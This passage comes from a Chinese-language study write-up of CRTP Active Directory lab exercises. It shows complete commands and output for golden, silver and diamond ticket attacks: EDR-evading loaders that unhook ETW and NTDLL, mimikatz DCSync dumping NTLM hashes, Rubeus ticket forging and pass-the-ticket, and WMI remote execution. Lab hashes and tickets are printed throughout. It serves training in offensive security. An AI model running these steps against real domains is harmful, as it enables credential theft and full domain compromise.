     k55PDVHs4toOACmr7JwXeHhCvENrUWmmfvRVi2y0qffO78vQflGfmeqCn1sIIO9sHis40XAvnHMcSsk3</span><br><span class="line">      e+ZxHgWF/ZyclFmb36/pcuUGOYqrXqNw22kbwPozXnxaiGiTF+/<span class="number">2</span>EODq8oybkORlqkzkMhbEgiAu69lT</span><br><span class="line">      lVFSwWq6jffNIPCb5VcFQCuTQWPp0QM2po+/phfp6CGtLylziJCKQOMBOamJPea+Ssy1gCIhDMhwKMoA</span><br><span class="line">      pUvePZAfmDKRnxh5zAxnPX5FKG2cvVWMN6fGWNF/WTZ4k3LJrlWEK/NLTRSDBY4lKWEatOvJjNH6K2po</span><br><span class="line">      p3kZGtjvXnzFg1c4szGrO6Hhz9WbspIU5+<span class="number">5</span>r6lT+/aGQRIqCncWqkQGd4un8mA6bDrE0MtXYugfgN6R7</span><br><span class="line">      XvMNYudA2cxM2oBfDJGwGI6qhAhC7t1fWHKjfCuL3tgtIujGoCTAxXgHDvB1m2t3dgQsm7YEGaw7GcHq</span><br><span class="line">      +x8C2aQCdA3vZ8veMeZHeIUPdV/VbjTIE8hbM+IOScIM4HWNf4UPrYtyCBBXqysiYUsdDjGX2URRPKWc</span><br><span class="line">      X7q3N9aXwI+AwSw8NthtG/TH9ZfAldYlXhLk3FZb1WtEJzTUVhcYE0fUNYqD/vY4nZttQGWETGFFacwa</span><br><span class="line">      XuC5jQsDZk7+Y7JJOLQzwv6Bop4+<span class="number">0</span><span class="built_in">rV</span>/mE4MzROpsFUa5C1kmWFtNe0B6BlSRjdCkvdH576daL/KaQiL</span><br><span class="line">      <span class="number">5</span>IfZ3mI0G6yjggEwMIIBLKADAgEAooIBIwSCAR99ggEbMIIBF6CCARMwggEPMIIBC6ArMCmgAwIBEqEi</span><br><span class="line">      BCBYQ17I7P62bK4bFJ1w1QYiNCXrw/PlsQtyX3fBoCX/raEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5M</span><br><span class="line">      T0NBTKIaMBigAwIBAaERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEDgAACkERgPMjAyNTA1MjYwNTQxMDla</span><br><span class="line">      pREYDzIwMjUwNTI2MDU0MTA5WqYRGA8yMDI1MDUyNjE1NDEwOVqnERgPMjAyNTA2MDIwNTQxMDlaqBwb</span><br><span class="line">      GkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3Jw</span><br><span class="line">      Lm1vbmV5Y29ycC5sb2NhbA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>

<p>此时查看当前票据缓存就有了administrator的票据</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-34.png" alt="alt text"></p>
<p>然后远程的dcorp-dc看下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\AD\Tools&gt; winrs -r:dcorp-dc cmd</span><br><span class="line">Microsoft Windows [Version 10.0.20348.2762]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;set username</span><br><span class="line">set username</span><br><span class="line">USERNAME=administrator</span><br></pre></td></tr></table></figure>

<p>然后金票结束</p>
<h2 id="Learning-Objective-9-1"><a href="#Learning-Objective-9-1" class="headerlink" title="Learning Objective - 9 - 1"></a>Learning Objective - 9 - 1</h2><blockquote>
<p>其银票证可用于 winrs 或 PowerShell 远程处理的服务</p>
</blockquote>
<p>因为winrs走的http所以flag是 <code>http</code></p>
<p>跟着lab手册做一下它对应的实验</p>
<p>可以通过下面来枚举</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObject|?&#123;$_.servicePrincipalName -ne $null&#125;|%&#123;$n=$_.samAccountName;$_.servicePrincipalName|%&#123;[PSCustomObject]@&#123;SamAccountName=$n;ServicePrincipalName=$_&#125;&#125;&#125;|ft -AutoSize</span><br></pre></td></tr></table></figure>

<p>然后这个dcorp-dc没有http的spn只有个host的</p>
<p>但还是试试http的，先拿到 <code>dcorp-dc$</code> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PS C:\ad\tools&gt; .\loader.exe -path http://127.0.0.1:8080/safetykatz.exe -args &quot;lsadump::evasive-dcsync /user:dcorp-dc$&quot; &quot;exit&quot;</span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : http://127.0.0.1:8080/safetykatz.exe Arguments : lsadump::evasive-dcsync /user:dcorp-dc$ exit</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp-dc$</span><br><span class="line">[DC] &#x27;dollarcorp.moneycorp.local&#x27; will be the domain</span><br><span class="line">[DC] &#x27;dcorp-dc.dollarcorp.moneycorp.local&#x27; will be the DC server</span><br><span class="line">[DC] &#x27;dcorp-dc$&#x27; will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : DCORP-DC</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : DCORP-DC$</span><br><span class="line">Account Type         : 30000001 ( MACHINE_ACCOUNT )</span><br><span class="line">User Account Control : 00082000 ( SERVER_TRUST_ACCOUNT TRUSTED_FOR_DELEGATION )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : 5/13/2025 2:01:08 PM</span><br><span class="line">Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-1000</span><br><span class="line">Object Relative ID   : 1000</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 68974417110f3488c8175787412704df</span><br></pre></td></tr></table></figure>

<p>然后构造银票并注入</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; C:\ad\tools\Loader.exe <span class="literal">-path</span> .\Rubeus.exe <span class="literal">-args</span>  Evasive<span class="literal">-Silver</span> /service:http/dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /krbkey:<span class="number">68974417110</span>F3488C8175787412704DF /kebenctype:rc4 /rc4:<span class="number">68974417110</span>F3488C8175787412704DF /user:administrator /id:<span class="number">500</span> /pgid:<span class="number">513</span> /domain:dollarcorp.moneycorp.local /sid:S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span> /pwdlastset:<span class="string">&quot;11/11/2022 6:34:22 AM&quot;</span> /logoncount:<span class="number">367</span> /netbios:dcorp /groups:<span class="number">544</span>,<span class="number">512</span>,<span class="number">520</span>,<span class="number">513</span> /dc:DCORP<span class="literal">-DC</span>.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt</span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\Rubeus.exe Arguments : Evasive<span class="literal">-Silver</span> /service:http/dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /krbkey:<span class="number">68974417110</span>F3488C8175787412704DF /kebenctype:rc4 /rc4:<span class="number">68974417110</span>F3488C8175787412704DF /user:administrator /id:<span class="number">500</span> /pgid:<span class="number">513</span> /domain:dollarcorp.moneycorp.local /sid:S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span> /pwdlastset:<span class="number">11</span>/<span class="number">11</span>/<span class="number">2022</span> <span class="number">6</span>:<span class="number">34</span>:<span class="number">22</span> AM /logoncount:<span class="number">367</span> /netbios:dcorp /groups:<span class="number">544</span>,<span class="number">512</span>,<span class="number">520</span>,<span class="number">513</span> /dc:DCORP<span class="literal">-DC</span>.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt</span><br><span class="line">[*] Action: Build TGS</span><br><span class="line"></span><br><span class="line">[*] Building PAC</span><br><span class="line"></span><br><span class="line">[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)</span><br><span class="line">[*] SID            : S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span></span><br><span class="line">[*] UserId         : <span class="number">500</span></span><br><span class="line">[*] Groups         : <span class="number">544</span>,<span class="number">512</span>,<span class="number">520</span>,<span class="number">513</span></span><br><span class="line">[*] ServiceKey     : <span class="number">68974417110</span>F3488C8175787412704DF</span><br><span class="line">[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5</span><br><span class="line">[*] KDCKey         : <span class="number">68974417110</span>F3488C8175787412704DF</span><br><span class="line">[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256</span><br><span class="line">[*] Service        : http</span><br><span class="line">[*] Target         : dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local</span><br><span class="line"></span><br><span class="line">[*] Generating EncTicketPart</span><br><span class="line">[*] Signing PAC</span><br><span class="line">[*] Encrypting EncTicketPart</span><br><span class="line">[*] Generating Ticket</span><br><span class="line">[*] Generated KERB<span class="literal">-CRED</span></span><br><span class="line">[*] Forged a TGS <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span> to <span class="string">&#x27;http/dcorp-dc.dollarcorp.moneycorp.local&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] AuthTime       : <span class="number">5</span>/<span class="number">26</span>/<span class="number">2025</span> <span class="number">1</span>:<span class="number">29</span>:<span class="number">44</span> AM</span><br><span class="line">[*] StartTime      : <span class="number">5</span>/<span class="number">26</span>/<span class="number">2025</span> <span class="number">1</span>:<span class="number">29</span>:<span class="number">44</span> AM</span><br><span class="line">[*] EndTime        : <span class="number">5</span>/<span class="number">26</span>/<span class="number">2025</span> <span class="number">11</span>:<span class="number">29</span>:<span class="number">44</span> AM</span><br><span class="line">[*] RenewTill      : <span class="number">6</span>/<span class="number">2</span>/<span class="number">2025</span> <span class="number">1</span>:<span class="number">29</span>:<span class="number">44</span> AM</span><br><span class="line"></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIGDjCCBgqgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD</span><br><span class="line">      T1JQLkxPQ0FMojYwNKADAgECoS0wKxsEaHR0cBsjZGNvcnAtZGMuZG9sbGFyY29ycC5tb25leWNvcnAu</span><br><span class="line">      bG9jYWyjggRmMIIEYqADAgEXoQMCAQOiggRUBIIEUOTvFBnPN/DKT71+<span class="number">3</span>s9vn/<span class="number">13</span>sGpDAuAVe+fT2ehv</span><br><span class="line">      <span class="number">3</span>jtnENp+eWKDU9Yhd1VRTQ5<span class="built_in">GU</span>+mYP25I2Lnob0FQVhRAA6rNR2<span class="built_in">h</span>+ON1vnpGXUiz3Hdls68UaZTJI2j+y</span><br><span class="line">      wKJuRAV9FdLqLQ6vz/BBgkhgN211OsELIj2SZHhTo2hPFu1NjD+XhW4ipEs3fdAFl3XMGkHQbtfo1pKu</span><br><span class="line">      bznz1x9PKP2ldArzQEYcyxMdDClGIUxkXc4yufkKHIrnLHBJGn1zrYWWWLAne1pVGIeq0EjETsdCBiYf</span><br><span class="line">      HWZp1cytXorZ7T/v/<span class="number">38</span>GuL6LtO72pDz6XNS+zvVr52Sj9u3NrLqC3dHc/ygI7GMQAJ+<span class="number">6</span>wU3TeHrNhldZ</span><br><span class="line">      eVg76hAAcc/WANFetpAtl8JPA7wjQMK05d7lx6M5WrRd5AUXOHTv2c04mSMMPmCCJeEokL6lQ3YEXETN</span><br><span class="line">      vgegzHi932omhZvkL4<span class="built_in">R</span>+z9s1+T46KrRlPQhzin5BFrSCJQVPSZZCOqfGCaeXtltmwq2/seIf6L+umeNo</span><br><span class="line">      kP11+<span class="number">1</span>ERiRGsVoKxK/NiauDrHCWU/ZpxqYR8nh0uUdQFw/vHUCwosui2EyZDAz0hNPRe2HDsRVJX7iED</span><br><span class="line">      <span class="number">7</span>jvP25RDfer3+MJ1yIu5KOZyUXx7/wQzIHPCDbUY+BDyx1c66VBStskIw+MmzW+zJbB8uhv4iQH+<span class="number">7</span>yUh</span><br><span class="line">      <span class="number">9</span>JBXpck6dY/IkCx7/jeJPVQwuK9tUALX9ONcZBMCO2KbEvN3/jtUHWecDx8kwtYRZaTH6mXEdG2ph9Zi</span><br><span class="line">      hfAHLh23Y8xyoVlSfYLGkukufAgb7nn0SjsBrI/cGVB077nTQFYL1tfC0oCmht2CEEtrsOQv68PZdyGU</span><br><span class="line">      +<span class="number">4</span>lHZtRJDGxrfBeQI6bSoBbyiOuQwvHhSga5vo392glFVyH+E+uR/HZ+znI+kvECzZnMXMj684UAPXaV</span><br><span class="line">      dLf8s/QdS4YHBJLivJsBTIrpzFtgAtMU2qsYmftOdamDzbCSYYfHGt0r41zbJ5SeICt53PkXRa3Uz/HG</span><br><span class="line">      LBV6s9XnlBmFw4ANjtR22kp9jNclj7ZTpzuOu8IrLVcIKSlShgwqH9Kn/<span class="number">9</span>DtgUwg1+<span class="number">650</span>DcgiVUTZXW8</span><br><span class="line">      kw4NKhmQgB/vSv54AfX2l5GRwrGoOPDZBD+qhptuBKsUsnAfoBmj26+CKGPD58C5+nYGix5rLq6RLPXc</span><br><span class="line">      A8jUr5qK0xhhKUiYOsxz0qFslGAvBDWYWuenKViq1gXHVfbyuBo/iPY9pRCN/SITW6EYAXir1ZhCfDI8</span><br><span class="line">      oJ3aIt+<span class="number">5</span>FZNkJ1LwT0mK6c9T7fB8zaKDCcjJozav2EKHqn0OFag2srGtGQK83g7qzVQde7ezRfj3HR0u</span><br><span class="line">      OFPFL+PmQvtlAL/MNWfPlGY+ZCykPVWxtvUbPmR6bCjHlcdCnGFTRGxrRFnxDgbDbpjKhLE59TiOUnq1</span><br><span class="line">      ulNw9huokZOtrgiRr3fI6KOxoQ5woLBpO/<span class="number">1</span>cK512igaePuQynZJJe00Ep3NtoxLYgOjYhTmfhqOCAScw</span><br><span class="line">      ggEjoAMCAQCiggEaBIIBFn2CARIwggEOoIIBCjCCAQYwggECoBswGaADAgEXoRIEELjnL4klvYczGh1<span class="built_in">H</span></span><br><span class="line">      <span class="number">0</span>UsAP4yhHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1hZG1pbmlzdHJh</span><br><span class="line">      dG9yowcDBQBAoAAApBEYDzIwMjUwNTI2MDgyOTQ0WqURGA8yMDI1MDUyNjA4Mjk0NFqmERgPMjAyNTA1</span><br><span class="line">      MjYxODI5NDRapxEYDzIwMjUwNjAyMDgyOTQ0WqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKk2</span><br><span class="line">      MDSgAwIBAqEtMCsbBGh0dHAbI2Rjb3JwLWRjLmRvbGxhcmNvcnAubW9uZXljb3JwLmxvY2Fs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>

<p>因为那个dcorp-dc上并没有http这个spn，所以winrs是报权限不足的..</p>
<p>不过有host可以试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:68974417110f3488c8175787412704df /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:68974417110f3488c8175787412704df /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt</span><br></pre></td></tr></table></figure>

<p>然后就可以走wmi了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS C:\ad\tools&gt; Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SystemDirectory : C:\Windows\system32</span><br><span class="line">Organization    :</span><br><span class="line">BuildNumber     : 20348</span><br><span class="line">RegisteredUser  : Windows User</span><br><span class="line">SerialNumber    : 00454-30000-00000-AA745</span><br><span class="line">Version         : 10.0.20348</span><br></pre></td></tr></table></figure>

<p>然后下发命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS C:\ad\tools&gt; Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;cmd.exe /c whoami&quot; -ComputerName dcorp-dc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__GENUS          : 2</span><br><span class="line">__CLASS          : __PARAMETERS</span><br><span class="line">__SUPERCLASS     :</span><br><span class="line">__DYNASTY        : __PARAMETERS</span><br><span class="line">__RELPATH        :</span><br><span class="line">__PROPERTY_COUNT : 2</span><br><span class="line">__DERIVATION     : &#123;&#125;</span><br><span class="line">__SERVER         :</span><br><span class="line">__NAMESPACE      :</span><br><span class="line">__PATH           :</span><br><span class="line">ProcessId        : 2784</span><br><span class="line">ReturnValue      : 0</span><br><span class="line">PSComputerName   :</span><br></pre></td></tr></table></figure>

<p>但这种方式没法直接看到回显，除非有个能把回显写入，然后当前用户有权限看的地方。</p>
<p>比如写入注册表，然后再查看</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Class</span> Win32_Process <span class="literal">-Name</span> Create <span class="literal">-ComputerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-ArgumentList</span> <span class="string">&#x27;cmd.exe /c for /f &quot;usebackq delims=&quot; %i in (&quot;C:\Windows\Temp\out.txt&quot;) do reg add &quot;HKLM\SOFTWARE\TempKey&quot; /v Who /t REG_SZ /d &quot;%i&quot; /f&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__GENUS          : <span class="number">2</span></span><br><span class="line">__CLASS          : __PARAMETERS</span><br><span class="line">__SUPERCLASS     :</span><br><span class="line">__DYNASTY        : __PARAMETERS</span><br><span class="line">__RELPATH        :</span><br><span class="line">__PROPERTY_COUNT : <span class="number">2</span></span><br><span class="line">__DERIVATION     : &#123;&#125;</span><br><span class="line">__SERVER         :</span><br><span class="line">__NAMESPACE      :</span><br><span class="line">__PATH           :</span><br><span class="line">ProcessId        : <span class="number">1468</span></span><br><span class="line">ReturnValue      : <span class="number">0</span></span><br><span class="line">PSComputerName   :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt;</span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="variable">$reg</span> = [<span class="type">Microsoft.Win32.RegistryKey</span>]::OpenRemoteBaseKey(<span class="string">&#x27;LocalMachine&#x27;</span>, <span class="string">&#x27;dcorp-dc&#x27;</span>)</span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="variable">$key</span> = <span class="variable">$reg</span>.OpenSubKey(<span class="string">&#x27;SOFTWARE\TempKey&#x27;</span>)</span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="variable">$key</span>.GetValue(<span class="string">&#x27;Who&#x27;</span>)</span><br><span class="line">dcorp\administrator</span><br></pre></td></tr></table></figure>

<p>为了做这个b实验，我先下发了一张da权限金票，然后给dcorp-dc加一个http的spn</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="variable">$spns</span> = (<span class="built_in">Get-DomainComputer</span> dcorp<span class="literal">-dc</span>).servicePrincipalName</span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="variable">$spns</span> += <span class="string">&#x27;HTTP/dcorp-dc.dollarcorp.moneycorp.local&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> dcorp<span class="literal">-dc</span><span class="variable">$</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">&#x27;servicePrincipalName&#x27;</span>=<span class="variable">$spns</span>&#125;</span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Get-DomainObject</span> <span class="literal">-Identity</span> dcorp<span class="literal">-dc</span> | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> serviceprincipalname</span><br><span class="line">HTTP/dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>

<p>然后再做这张银票，远程winrs就ok</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-35.png" alt="alt text"></p>
<h2 id="Learning-Objective-10-1"><a href="#Learning-Objective-10-1" class="headerlink" title="Learning Objective - 10 - 1"></a>Learning Objective - 10 - 1</h2><blockquote>
<p>Name of the account whose secrets are used for the Diamond Ticket attack</p>
</blockquote>
<blockquote>
<p>用哪个账户的密钥做钻石票攻击</p>
</blockquote>
<p>flag显然是 <code>krbtgt</code>，因为用它解密TGT的pac又重新加密包装的</p>
<p>先获取当前域的krbtgt的aes256key <strong>注：只能dcsync才能获得</strong></p>
<p>先拿个域管TGT</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Loader.exe <span class="literal">-path</span>  .\Rubeus.exe <span class="literal">-args</span> asktgt  /user:svcadmin /aes256:<span class="number">6366243</span>a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /ptt</span><br></pre></td></tr></table></figure>

<p>然后dcsync拿krbtgt的aes256key</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt;  .\Loader.exe <span class="literal">-path</span>  .\SafetyKatz.exe <span class="literal">-args</span> <span class="string">&quot;lsadump::evasive-dcsync /user:dcorp\krbtgt&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\SafetyKatz.exe Arguments : 